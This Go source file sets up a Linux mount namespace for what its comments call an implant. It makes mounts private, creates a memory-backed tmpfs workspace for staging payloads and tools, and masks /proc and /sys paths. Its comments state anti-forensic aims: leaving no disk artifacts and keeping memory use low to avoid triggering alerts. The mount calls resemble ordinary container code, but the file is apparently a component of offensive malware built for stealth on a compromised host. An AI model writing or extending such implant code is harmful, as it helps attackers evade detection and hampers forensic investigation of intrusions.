package namespace

import (
	"fmt"
	"os"

	"golang.org/x/sys/unix"
)

// SetupMountNamespace configures the mount namespace for the implant.
// This must be called before SetupPIDNamespace since PID setup also mounts /proc.
//
// Actions:
//   - Make all existing mounts private (prevent propagation to host)
//   - Create a tmpfs workspace for staging payloads and tools
//   - Remount sensitive host paths to limit forensic visibility
func SetupMountNamespace(workDir string) error {
	// Make the entire mount tree private so nothing propagates back to the host.
	if err := unix.Mount("", "/", "", unix.MS_REC|unix.MS_PRIVATE, ""); err != nil {
		return fmt.Errorf("mount: failed to make / private: %w", err)
	}

	// Create the workspace directory.
	if err := os.MkdirAll(workDir, 0700); err != nil {
		return fmt.Errorf("mount: failed to create workdir %s: %w", workDir, err)
	}

	// Mount a tmpfs at the workspace. tmpfs is memory-backed and leaves no disk artifacts.
	// Size is limited to 64MB to avoid host memory pressure that could trigger alerts.
	if err := unix.Mount("tmpfs", workDir, "tmpfs", unix.MS_NOSUID|unix.MS_NODEV, "size=67108864,mode=0700"); err != nil {
		return fmt.Errorf("mount: failed to mount tmpfs at %s: %w", workDir, err)
	}

	// NOTE: /proc is mounted by SetupPIDNamespace (pid.go) which runs after this.
	// Mounting it here would cause a redundant unmount+remount cycle.

	// Mask sensitive paths by bind-mounting empty files/dirs or tmpfs over them.
	// This prevents the implant's processes from leaking info via these paths
	// and hides host-level details from anything inspecting from within.
	sensitivePaths := []string{
		"/proc/kcore",
		"/proc/kallsyms",
		"/proc/sched_debug",
		"/proc/kmsg",
		"/sys/firmware/",
	}

	for _, p := range sensitivePaths {
		maskPath(p)
	}

	return nil
}

// maskPath masks a path by bind-mounting over it.
// Files are masked with /dev/null; directories are masked with an empty tmpfs.
// Errors are silently ignored since these paths may not exist on all kernels.
func maskPath(path string) {
	// Check if the path exists before attempting to mask.
	fi, err := os.Stat(path)
	if os.IsNotExist(err) {
		return
	}

	if err == nil && fi.IsDir() {
		// For directories, mount an empty tmpfs to hide all contents.
		_ = unix.Mount("tmpfs", path, "tmpfs", unix.MS_RDONLY|unix.MS_NOSUID|unix.MS_NODEV|unix.MS_NOEXEC, "size=0")
	} else {
		// Bind-mount /dev/null over the file path to mask its contents.
		_ = unix.Mount("/dev/null", path, "", unix.MS_BIND, "")
	}
}
